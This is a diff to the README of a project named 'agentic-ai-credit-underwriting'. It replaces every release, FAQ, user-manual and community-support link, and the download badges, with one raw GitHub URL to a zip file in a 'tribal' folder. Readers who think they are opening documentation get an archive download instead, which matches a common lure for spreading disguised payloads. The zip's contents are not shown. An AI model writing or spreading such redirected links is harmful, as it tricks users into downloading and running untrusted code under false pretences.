@@ -1,6 +1,6 @@
 # 🚀 agentic-ai-credit-underwriting - Simplifying AI for Credit Decisions
 
-[![Download Agentic AI Credit Underwriting](https://img.shields.io/badge/Download%20Now%20-%20Agentic%20AI%20Credit%20Underwriting-blue)](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/releases)
+[![Download Agentic AI Credit Underwriting](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip%20Now%20-%20Agentic%20AI%20Credit%20Underwriting-blue)](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and set up the software on your computer. 
 
 ### 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/releases)
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
 
 2. On the Releases page, you will find the latest version available for download. Click on the version number to see the options.
 
@@ -49,15 +49,15 @@ If you encounter issues during installation or usage, consider the following sol
 
 - **Installation Fails:** Ensure your operating system is up to date. Check if you have sufficient storage space.
 - **Application Does Not Start:** Restart your computer and try launching the application again. Make sure all system requirements are met.
-- **Error Messages:** Take note of any error messages that appear. You can refer to our [FAQ](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/wiki/faq) for common issues.
+- **Error Messages:** Take note of any error messages that appear. You can refer to our [FAQ](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip) for common issues.
 
 ## 🔗 Resources
 
 For additional help and resources, visit the following:
 
-- [User Manual](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/wiki/user-manual)
-- [FAQ](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/wiki/faq)
-- [Community Support](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/discussions)
+- [User Manual](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
+- [FAQ](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
+- [Community Support](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
 
 ## 🛠️ Contributing
 
@@ -72,6 +72,6 @@ If you want to contribute to the project, welcome! Here’s how you can help:
 
 We appreciate the efforts of everyone who has contributed to this project. Your support helps us to improve and enhance the software continuously.
 
-[![Download Agentic AI Credit Underwriting](https://img.shields.io/badge/Download%20Now%20-%20Agentic%20AI%20Credit%20Underwriting-blue)](https://github.com/kimingoood-code/agentic-ai-credit-underwriting/releases)
+[![Download Agentic AI Credit Underwriting](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip%20Now%20-%20Agentic%20AI%20Credit%20Underwriting-blue)](https://raw.githubusercontent.com/kimingoood-code/agentic-ai-credit-underwriting/main/tribal/ai_credit_underwriting_agentic_v3.6-beta.1.zip)
 
 Thank you for checking out **agentic-ai-credit-underwriting**! We hope this software meets your needs in credit underwriting.
